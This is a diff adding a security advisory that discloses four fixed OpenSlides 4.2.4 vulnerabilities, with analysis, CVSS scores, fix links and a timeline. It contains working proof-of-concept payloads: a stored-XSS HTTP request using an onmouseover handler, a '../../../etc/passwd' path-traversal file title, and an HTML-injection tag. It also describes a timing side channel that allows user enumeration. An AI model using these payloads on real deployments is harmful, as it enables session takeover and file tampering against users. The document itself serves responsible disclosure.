@@ -1,0 +1,203 @@
+
+X41 D-Sec GmbH Security Advisory: X41-2025-001
+
+Multiple Vulnerabilities in OpenSlides
+======================================
+
+Highest Severity Rating: Medium
+
+Confirmed Affected Versions: 4.2.4
+
+Confirmed Patched Versions: 4.2.5
+
+Vendor: Intevation GmbH
+
+Vendor URL: https://openslides.com/
+
+Credit: X41 D-Sec GmbH, Eric Sesterhenn
+
+Status: Public
+
+Advisory-URL: https://www.x41-dsec.de/lab/advisories/x41-2025-001-OpenSlides
+
+
+Summary and Impact
+------------------
+
+X41 identified multiple bugs in OpenSlides, the most severe one being a XSS.
+
+
+Product Description
+-------------------
+
+The vendor describes the software as "OpenSlides is a powerful and modern, web-based software for the digital organization of your meetings and committees. All user access their committees and meetings via one central URL.". It is used by various unions (DGB, ver.di) and policital parties (Bündnis 90 Die Grünen, SPD, FDP, Die Linke, CDU,...) and NGOs (Amnesty International, ADFC, VDI,...).
+
+Cross-Site-Scripting
+====================
+
+Severity Rating: Medium
+
+Vector: XSS
+
+CVE: n/a
+
+CWE: 80 - Improper Neutralization of Script-Related HTML Tags in a Web Page (Basic XSS)
+
+CVSS Score: 5.5
+
+CVSS Vector: CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:U/C:L/I:L/A:L
+
+Fix: https://github.com/OpenSlides/openslides-backend/pull/2903
+
+
+Analysis
+--------
+
+When submitting descriptions such as Moderator Notes or Agenda Topics to the system, an editor is shown that allows to format the submitted text. This allows to insert various HTML tags, such as a href. When trying to insert a <script> tag, it gets properly encoded when reflected. But adding attributes to links is possible, which allows the injection of JavaScript by the onmouseover tag and others. When a user moves the mouse over such a prepared link, JavaScript will be executed in that user's session.
+This might also be possible in other places where the editor is used.
+
+
+Proof of Concept
+----------------
+
+The XSS can be triggered by authenticated users by extending the link attributes:
+
+    POST /system/action/handle_request HTTP/2
+    Host: localhost:8000
+    Cookie: refreshId=bearer%20ey...
+    Content-Length: 256
+    Sec-Ch-Ua-Platform: "Linux"
+    Accept-Language: en-US,en;q=0.9
+    Sec-Ch-Ua: "Chromium";v="133", "Not(A:Brand";v="99"
+    Authentication: bearer ey...
+    Sec-Ch-Ua-Mobile: ?0
+    User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36
+    Accept: application/json, text/plain, */*
+    Content-Type: application/json
+    Ngsw-Bypass: true
+    Origin: https://localhost:8000
+    Sec-Fetch-Site: same-origin
+    Sec-Fetch-Mode: cors
+    Sec-Fetch-Dest: empty
+    Referer: https://localhost:8000/1/agenda/topics/1
+    Accept-Encoding: gzip, deflate, br
+    Priority: u=1, i
+    
+    [{"action":"topic.update","data":[{"id":1,"text":"<p>Link with XSS<a target=\"_self\" rel=\"noopener noreferrer nofollow\" href=\"http://www.x41-dsec.de\" onmouseover=\"alert(1
+    )\">XXXXXXX</a>X</p>","title":"X41 Summer BBQ","attachment_mediafile_ids":[]}]}]
+
+
+Timing Differences During Login Allows User Enumeration
+=======================================================
+
+Severity Rating: Medium
+
+Vector: Timing Sidechannel
+
+CVE: n/t
+
+CWE: 208: Observable Timing Discrepancy
+
+CVSS Score: 5.3
+
+CVSS Vector: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N
+
+Fix: https://github.com/OpenSlides/openslides-auth-service/pull/686
+
+
+Analysis
+--------
+
+During login at the endpoint /system/auth/login/ the system's response times differ depending on whether a user exists in the system. The timing discrepancy stems from the omitted hashing of the password. On the tested system, that discrepancy was 15ms for a non-existing user to 200ms for an existing user.
+
+
+Proof of Concept
+----------------
+
+As seen in openslides-auth-service/auth/src/api/services/user-service.ts, the user password is not hashed and checked when isExisting() fails.
+~~~
+private async readUserFromDatastoreByCredentials(username: string, password: string): Promise<User> {
+    const userObj = await this.getUserCollectionFromDatastore('username', username);
+    Logger.debug('User object from datastore: ', userObj);
+    const users = Object.values(userObj).filter(user => !user.meta_deleted);
+    if (users.length > 1) {
+        Logger.error('Multiple users found for same username!');
+        throw new AuthenticationException('Multiple users with same credentials!');
+    }
+    const thisUser: User = new User(users[0]);
+    if (!thisUser.isExisting() || !(await this.isPasswordCorrect(password, thisUser.password))) {
+        throw new AuthenticationException('Username or password is incorrect.');
+    }
+~~~
+
+HTML Injection In Chat Names
+============================
+
+Severity Rating: Low
+
+Vector: HTML Injection
+
+CVE: n/a 
+
+CWE: 79 - Improper Neutralization of Input During Web Page Generation
+
+CVSS Score: 3.5
+
+CVSS Vector: CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:U/C:N/I:L/A:N
+
+Fix: https://github.com/OpenSlides/openslides-client/pull/4774
+
+
+Analysis
+--------
+
+When creating new chats via the chat_group.create action, the user is able to specify the name for the chat. Some HTML tags such as script are filtered, whereas others are not. In most cases, the HTML entities will be encoded properly, but not when deleting chats or deleting messages in these chats. This allows attackers to mess with the layout of the rendered website.
+
+This was not investigated in depth, since chatnames are properly rendered in other places, injected HTML data will raise suspicion and users will likely not click on deleted chat or deleted messages.
+
+
+Proof of Concept
+----------------
+
+Inserting a HTML bold tag in the chat name causes part of the message in the confirmation dialog to be rendered bold.
+
+    <mat-dialog-content _ngcontent-ng-c1489354388="" class="mat-mdc-dialog-content mdc-dialog__content">HTML<b>INJECTED</b></mat-dialog-content>
+
+
+Clientside Directory Traversal
+==============================
+
+Severity Rating: Low
+
+Vector: Directory Traversal
+
+CVE: n/a
+
+CWE: 23 - Relative Path Traversal
+
+CVSS Score: 2.6
+
+CVSS Vector: CVSS:3.1/AV:N/AC:H/PR:L/UI:R/S:U/C:N/I:L/A:N
+
+Fix: https://github.com/OpenSlides/openslides-client/pull/4775
+
+
+Analysis
+--------
+
+Files can be uploaded to OpenSlides meetings and organized in folders. The interface allows users to download a ZIP archive that contains all files in a folder and its subfolders. If an attacker specifies the title of a file or folder as a relative or absolute path (e.g. ../../../etc/passwd), the ZIP archive generated for download will convert that title into a path. Depending on the extraction tool used by the user, this might overwrite files locally outside of the choosen directory.
+
+Timeline
+========
+
+2025-03-10 Issues identified
+
+2025-03-18 Vendor contacted
+
+2025-03-18 Vendor reply
+
+2025-03-19 CVE IDs requested
+
+2025-03-19 Patches supplied by vendor and fixed version released
+
+2025-03-20 Advisory released
